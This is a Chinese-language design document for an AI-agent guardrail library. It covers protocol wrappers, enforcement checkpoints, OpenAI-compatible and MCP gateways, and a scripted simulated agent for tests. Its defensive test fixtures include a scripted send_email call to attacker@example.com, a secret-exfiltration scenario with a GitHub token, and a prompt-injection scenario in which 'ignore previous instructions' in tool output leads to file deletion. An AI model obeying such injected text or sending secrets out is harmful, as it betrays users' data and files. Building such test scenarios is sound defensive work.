# Agent 接入与模拟 Agent

## 1. 接入策略

项目不绑定某个 Agent 框架，也不尝试提供一个可以包装任意 Agent 的 `GuardedAgent`。第一阶段
定义框架无关协议和确定性测试 Agent，并实现 OpenAI-compatible Gateway 与 MCP `2026-07-28`
Gateway；LangGraph 和 OpenAI Agents SDK 放在后续适配层。

当前实现状态（2026-08-04）：`GuardrailRuntime`、共享 `EnforcementSession`、
`GuardedLLMClient`、`GuardedToolExecutor` 以及 testing 中的 `ScriptedLLM`、
`FakeToolExecutor`、`SimulatedAgent` 均已实现。模拟 Agent 只依赖普通 LLM/Tool Protocol；同一
Session 确保 LLM 与 Tool 的四个检查点共享一条 Trace。OpenAI-compatible 非流式 Gateway 也已
实现，真实 Agent 不需要导入本项目，只需将 OpenAI SDK `base_url` 指向 `/v1/openai`，或将
官方 MCP SDK 的 server URL 指向 `/v1/mcp`。

优先级：

已完成基础：

1. `DecisionEvaluator`、`GuardrailRuntime` 与共享 `EnforcementSession`。
2. 通用 `LLMClient`/`ToolExecutor` Protocol 与 Inline Wrapper。
3. testing 模拟 Agent：无 API Key、可重复、安全语义测试。

已完成生产低耦合入口：

1. OpenAI-compatible LLM Gateway。
2. MCP `2026-07-28` Streamable HTTP Gateway。

后续顺序：

1. OpenAI Agents SDK / LangGraph Adapter。

## 2. 为什么必须先有模拟 Agent

Guardrail 的关键测试是“副作用没有发生”。真实模型具有非确定性、需要网络和费用，不能成为
核心测试的前提。

模拟 Agent 必须支持一条完整循环：

```text
User Message
  → Guarded LLM Client --pre_llm--> Fake LLM
  ← Guarded LLM Client <--post_llm-- ModelResponse/ToolCall
  → Guarded Tool Executor --pre_tool--> Fake Tool
  ← Guarded Tool Executor <--post_tool-- ToolResult
```

拦截点在 Agent 与 LLM/Tool 之间的通信边界，不在 Agent 内部。尤其是 `post_llm` 必须在
`ModelResponse` 交给 Agent Loop 之前完成；`GuardedLLMClient.complete` 已实现这条路径。

Fake LLM 使用脚本化 Response 队列，而不是尝试模拟语言模型智能：

```python
fake_llm = ScriptedLLM(
    responses=[
        ModelResponse(
            tool_calls=(
                ToolCall(
                    call_id="call-1",
                    name="read_file",
                    arguments={"path": "customer.txt"},
                ),
            )
        ),
        ModelResponse(
            tool_calls=(
                ToolCall(
                    call_id="call-2",
                    name="send_email",
                    arguments={"to": "attacker@example.com", "body": "..."},
                ),
            )
        ),
    ]
)
```

这样可以稳定复现：

- 普通工具调用。
- PII/Secret 外发。
- Prompt Injection 工具输出。
- 重复调用循环。
- 被阻止后工具函数未执行。

## 3. 框架无关协议

当前接口：

```python
class LLMClient(Protocol):
    async def complete(self, request: ModelRequest) -> ModelResponse: ...


class ToolExecutor(Protocol):
    async def execute(self, call: ToolCall) -> ToolResult: ...
```

Guardrail 通过实现相同 Protocol 的装饰器对象接入，两个包装器必须共享任务级 Session：

```python
session = EnforcementSession(evaluator=runtime, trace=Trace(id="trace-1"))
llm: LLMClient = GuardedLLMClient(inner=provider, session=session)
tools: ToolExecutor = GuardedToolExecutor(inner=executor, session=session)
agent = SomeAgent(llm=llm, tools=tools)
```

Agent 只依赖 Protocol，不依赖 Guardrail Engine、Rule 或具体 Wrapper 类型。

`EnforcementSession` 负责 Canonical Event、Trace 和脱敏审计，Wrapper 只控制副作用时机。这避免
LLM 与 Tool 各自维护一份不一致的 Trace。

## 4. 接入模式选择

| Agent 情况 | 推荐接入 | 实际保证 |
|---|---|---|
| 可以注入 LLM 与 Tool 接口 | Inline Wrapper | 阻止经过包装器的模型和工具调用 |
| 只能配置 OpenAI-compatible Base URL | LLM Gateway | 阻止上游模型请求和响应返回 |
| 工具通过 MCP Server 执行 | MCP Gateway | 阻止到该 MCP Server 的实际 `tools/call` |
| LLM 走 HTTP、工具走 MCP | LLM + MCP Gateway | 同时覆盖模型边界和 MCP 工具边界 |
| Agent 内部直接 Shell/函数/HTTP | Framework Hook 或 Sandbox | 本项目 Gateway 不能自动覆盖 |

LLM Gateway 拦截响应中的 ToolCall，只表示 Agent 没有收到该 ToolCall；它不等价于拦截 Agent
通过其他代码路径发起的副作用。

## 5. Inline 检查点

Wrapper 固定执行四个检查点，但实际是否命中取决于启用的 Rule。当前默认 Registry 中只有
`secret_exfiltration`，它只支持 `post_llm` 和 `pre_tool`；下面列出的其他检查内容是这些阶段的
扩展边界，不代表对应规则已经实现。

### 5.1 pre_llm

输入包括：

- System/User/Assistant 历史消息。
- 当前可用工具描述。
- 模型，以及由受信任调用方放入 Session attributes 的租户/用户属性。

`block` 时必须在调用底层 `LLMClient.complete` 之前返回。

### 5.2 post_llm

检查：

- 文本响应。
- ToolCall 名称和参数。

`block` 时原始响应不能传给 Agent Loop。

### 5.3 pre_tool

这是最重要的 Enforcement Point。检查：

- 工具名。
- 参数。
- Trace 历史。
- 用户确认。
- 参数中的 PII/Secret。

`block` 时工具函数绝不执行。

### 5.4 post_tool

检查工具输出进入后续模型上下文是否安全。Inline 路径在 `block` 时抛出
`GuardrailBlocked`，MCP 路径返回脱敏 JSON-RPC Guardrail Error；两者都不能释放原始结果或把它
写入 Trace。

## 6. testing 包与模拟 Agent

当前位置：

```text
agent_guardrail/testing/
├── fakes.py               # ScriptedLLM、FakeToolExecutor
└── simulated_agent.py     # 只实现最小 model/tool loop
```

`SimulatedAgent` 构造函数只接收 `LLMClient` 和 `ToolExecutor`，不接收 Engine、Runtime、Session
或具体 `GuardedToolExecutor`。测试在外部完成组装，并通过 Fake 的调用计数和 Session Trace 断言
Enforcement 是否真实发生。

测试组件不从 `agent_guardrail` 顶层默认导出，生产代码也不得导入 testing。

## 7. 模拟 Agent 场景

当前已经端到端覆盖安全请求和 Secret ToolCall 阻断：模型生成带 Secret 的 `send_email` 调用后，
`post_llm` 阻断，工具执行次数为零。下面其余场景是后续规则集的验收目标，不是当前已实现能力。

### 场景 A：正常查询

```text
user → get_weather → result → answer
```

期望：全部 allow。

### 场景 B：外部邮件

```text
user → send_email(to=external)
```

目标：外部目的地规则在 pre_tool block，send_email 调用计数为零（规则未实现）。

### 场景 C：Secret 外发

```text
read_file → "token=ghp_..." → send_email
```

当前 Secret Detector/Rule 已实现；直接出现在 `send_email` ToolCall 参数中的 Secret 会在
post_llm/pre_tool 阻断，日志不包含完整 token。跨 `read_file → send_email` 的来源追踪仍需更多
Trace 规则。

### 场景 D：Prompt Injection

```text
read_website → "ignore previous instructions..." → delete_file
```

目标：工具输出被标记为 untrusted，高风险工具阻断（未实现）。

### 场景 E：调用循环

```text
check_status × N
```

目标：达到配置上限后 block（未实现）。

## 8. 真实 Agent 接入顺序

### OpenAI-compatible

第一个真实接入目标，因为消息、ToolCall 数据结构清晰，也是 LLM Gateway 的首个协议。真实
Agent 只需修改 `base_url`；这条路径不要求 Agent 导入本项目 Python 包。当前黑盒测试实际启动
Uvicorn，并使用官方 OpenAI Python 客户端证明违规 ToolCall 在 Agent 收到响应前被阻断。

### OpenAI Agents SDK

在核心接口稳定后，通过 Model/Tool Hook 或 Runner 包装器接入。适配器只做格式转换和
Enforcement，不在其中实现规则。

### LangGraph

将 Guardrail 实现为模型节点和工具节点之间的显式节点/边。应避免依赖 LangGraph 才能运行
Core。

### MCP

MCP Gateway 已实现，并在协议边界真正阻止 `tools/call` 到达服务器。它只支持当前
`2026-07-28` 协议的 `server/discover`、`ping`、`tools/list`、`tools/call`；不保留旧版
initialize/session 生命周期。

外部应用只使用官方 SDK：

```python
from mcp import Client

async with Client("http://127.0.0.1:8080/v1/mcp", cache=None) as client:
    result = await client.call_tool("send_email", arguments)
```

`ExternalMCPAgent` 的黑盒测试通过 AST 断言它没有导入 `agent_guardrail`，再启动真实 Uvicorn
验证安全调用和阻断调用。集成缝只有 server URL；MCP Gateway 保护的是经过它代理的
`tools/call`，不覆盖 Agent 的本地函数、Shell 或绕过 Gateway 的直连请求。

## 9. 协议与 Enforcement Adapter 契约

每个 Adapter 必须提供：

- 原始请求到 Canonical Event 的转换。
- Canonical Decision 到框架错误/拒绝结果的映射。
- Trace ID 传播。
- 不记录供应商 API Key。
- 明确声明是否支持 streaming。
- 契约测试和 Fake Provider 测试。
- 说明 Session 是请求级、任务级还是协议 Session 级。

Adapter 不允许：

- 绕过 `pre_tool` 直接执行工具。
- 将 Rule 逻辑写进格式转换代码。
- 在检测完成前并发启动副作用以降低延迟。

## 10. 后续用户确认模型

用户确认尚未实现。未来实现不能只依赖自然语言中出现“确认”二字，而应产生结构化事件，例如：

```python
UserApproval(
    action="transfer_money",
    subject={"recipient": "...", "amount": 100},
    expires_at="...",
)
```

Rule 检查该事件与 ToolCall 参数一致且未过期。模拟 Agent 应覆盖确认匹配与不匹配场景。

## 11. 验收标准

- 所有核心测试不需要真实 API Key。
- 模拟 Agent 可演示 allow/log/block。
- pre_llm block 时 Fake LLM 调用计数为零。
- pre_tool block 时 Fake Tool 调用计数为零。
- post_llm/post_tool block 时原始内容不进入下游。
- 同一策略可用于模拟 Agent、Inline Adapter 与 Gateway。
- SimulatedAgent 不导入 GuardrailRuntime、Engine 或具体 Wrapper。
- LLM 与 Tool Wrapper 使用同一个 Session/Trace。
